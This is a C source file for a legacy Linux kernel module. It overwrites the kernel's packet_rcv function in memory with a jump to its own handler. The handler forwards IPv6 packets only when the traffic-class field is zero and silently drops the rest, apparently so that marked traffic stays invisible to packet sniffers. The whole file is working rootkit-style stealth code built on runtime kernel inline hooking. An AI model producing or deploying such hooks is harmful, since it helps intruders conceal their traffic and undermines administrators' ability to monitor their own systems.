/*
 *  pktrcv.c <packet_rcv hook funcs...>
 *
 *  160202  ulix <ulix@gmx.it>
 */

#ifndef __KERNEL__
#  define __KERNEL__
#endif
#ifndef MODULE
#  define MODULE
#endif

#ifdef DEBUG
#  define dbg(fmt, args...) \
	printk(KERN_DEBUG "pktrcv: %s: " fmt, __FUNCTION__ , ##args)
#else
#  define dbg(fmt, args...)
#endif

#include <linux/kernel.h>
#include <linux/module.h>

#include <linux/types.h>
#include <linux/errno.h>

#include <linux/string.h>
#include <asm/string.h>

#include <linux/netdevice.h>
#include <net/ipv6.h>

#include "pktrcv.h"


void *recode (void* dst, const void* src, unsigned int s)
{
	register unsigned int j;

	if (!src || !dst || !s)
		return NULL;
	for (j = 0; j < s; j++)
		((unsigned char *) dst)[j] = ((unsigned char *) src)[j];
	return (dst);
}

int new_packet_rcv
(struct sk_buff *skb, struct net_device *dev, struct packet_type *pkt)
{
	struct ipv6hdr *hdr = skb->nh.ipv6h;
	u_int8_t half_tclass = hdr->priority;

	dbg("src: %04x:%04x:%04x:%04x:%04x:%04x:%04x:%04x\n", dip(hdr->saddr));
	dbg("src: %04x:%04x:%04x:%04x:%04x:%04x:%04x:%04x\n", dip(hdr->daddr));

	dbg("len: %u tclass: %u hlim: %u flowlabel: %u\n",
	       ntohs(hdr->payload_len) + sizeof(struct ipv6hdr),
	       (ntohl(*(u_int32_t *)hdr) & 0x0ff00000) >> 20,
	       hdr->hop_limit,
	       (ntohl(*(u_int32_t *)hdr) & 0x000fffff));

	if (!half_tclass) {
		int ret;
		/** resetting old byte_code **/
		recode(old_packet_rcv, old_rcv_code, SIZE);
		/** saving original func + original args **/
		ret = old_packet_rcv(skb, dev, pkt);
		/** resetting jump in our func **/
		recode(old_packet_rcv, new_rcv_code, SIZE);
		/** return original func + original args **/
		return (ret);
	}
	return (0);
}

int init_module (void)
{
	*(long *)&new_rcv_code[1] = (long)new_packet_rcv;
	dbg("setting new_rcv_code[1]...\n");
	recode(old_rcv_code, old_packet_rcv, SIZE);
	dbg("saving old_rcv_code...\n");
	recode(old_packet_rcv, new_rcv_code, SIZE);
	dbg("setting new_rcv_code in old_packet_rcv...\n");

	dbg("module loaded...\n");
	return (0);
}

void cleanup_module (void)
{
	recode(old_packet_rcv, old_rcv_code, SIZE);
	dbg("resetting old_packet_rcv with old_rcv_code...\n");

	dbg("module unloaded...\n");
}
